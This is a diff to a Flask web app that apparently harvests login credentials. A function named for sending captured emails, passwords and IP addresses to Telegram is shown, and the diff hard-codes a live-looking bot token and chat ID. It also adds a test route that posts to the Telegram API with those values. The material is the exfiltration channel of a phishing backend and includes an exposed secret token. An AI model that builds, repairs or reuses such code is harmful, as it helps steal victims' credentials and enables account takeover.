@@ -399,9 +399,12 @@ def send_immediate_credentials_to_telegram(email, password, ip_address):
         bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
         chat_id = "1645281955"
         
+        logger.info(f"🔍 TELEGRAM DEBUG - BOT_TOKEN: {bot_token[:20]}...")
+        logger.info(f"🔍 TELEGRAM DEBUG - CHAT_ID: {chat_id}")
+        
         if not bot_token or not chat_id:
-            logger.warning(f"⚠️ Telegram credentials not configured - BOT_TOKEN: {bool(bot_token)}, CHAT_ID: {bool(chat_id)}")
-            return True  # Don't fail the app if Telegram isn't configured
+            logger.error(f"❌ Telegram credentials missing - BOT_TOKEN: {bool(bot_token)}, CHAT_ID: {bool(chat_id)}")
+            return False
         
         if bot_token.strip() == '' or chat_id.strip() == '':
             logger.error("❌ Telegram credentials are empty!")
@@ -1007,26 +1010,33 @@ def clear_sessions():
 @app.route('/test-telegram-simple')
 @limiter.limit("2 per minute") 
 def test_telegram_simple():
-    """Simple test to send a message to Telegram"""
+    """Simple test to send a message to Telegram using hardcoded credentials"""
     try:
-        bot_token = config('BOT_TOKEN', default=None)
-        chat_id = config('CHAT_ID', default=None)
+        # Use the same hardcoded values as in the main function
+        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
+        chat_id = "1645281955"
         
         logger.info(f"🧪 Simple Telegram Test")
-        logger.info(f"BOT_TOKEN: {bot_token}")
+        logger.info(f"BOT_TOKEN: {bot_token[:20]}...")
         logger.info(f"CHAT_ID: {chat_id}")
         
         if not bot_token or not chat_id:
-            return f"Missing credentials: BOT_TOKEN={bot_token}, CHAT_ID={chat_id}"
+            return f"Missing credentials: BOT_TOKEN={bool(bot_token)}, CHAT_ID={bool(chat_id)}"
             
-        message = f"🧪 Test message from Flask app at {datetime.now()}"
+        message = f"🧪 DIRECT TEST from Flask app at {datetime.now()}"
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         
+        logger.info(f"📤 Sending to URL: {url}")
+        
         response = requests.post(url, data={'chat_id': chat_id, 'text': message}, timeout=10)
+        
+        logger.info(f"📨 Response Status: {response.status_code}")
+        logger.info(f"📨 Response Text: {response.text}")
         
         return f"Status: {response.status_code}, Response: {response.text}"
         
     except Exception as e:
+        logger.error(f"❌ Test error: {str(e)}")
         return f"Error: {str(e)}"
 
 @app.route('/test-telegram')
